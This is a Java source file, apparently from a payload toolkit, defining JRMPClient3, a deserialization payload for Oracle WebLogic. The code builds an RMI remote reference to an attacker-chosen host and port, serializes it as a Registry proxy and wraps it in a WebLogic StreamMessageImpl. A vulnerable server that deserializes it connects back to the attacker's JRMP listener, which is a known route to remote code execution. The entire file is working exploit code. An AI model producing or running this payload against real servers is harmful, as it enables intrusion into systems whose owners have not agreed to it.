package superman.payloads;


import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import superman.core.Url;
import superman.util.Serializer;
import weblogic.jms.common.StreamMessageImpl;

import java.io.IOException;
import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class JRMPClient3 implements NoEchoPayload<StreamMessageImpl> {

    public StreamMessageImpl getObject (final Url url ) throws IOException {
        String host=url.getHost();
        int port=url.getPort();
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Object object = Proxy.newProxyInstance(JRMPClient3.class.getClassLoader(), new Class[] {
            Registry.class
        }, obj);
        return streamMessageImpl(Serializer.serialize(object));
    }
    public StreamMessageImpl streamMessageImpl(byte[] object) {
        StreamMessageImpl streamMessage = new StreamMessageImpl();
        streamMessage.setDataBuffer(object, object.length);
        return streamMessage;
    }

}
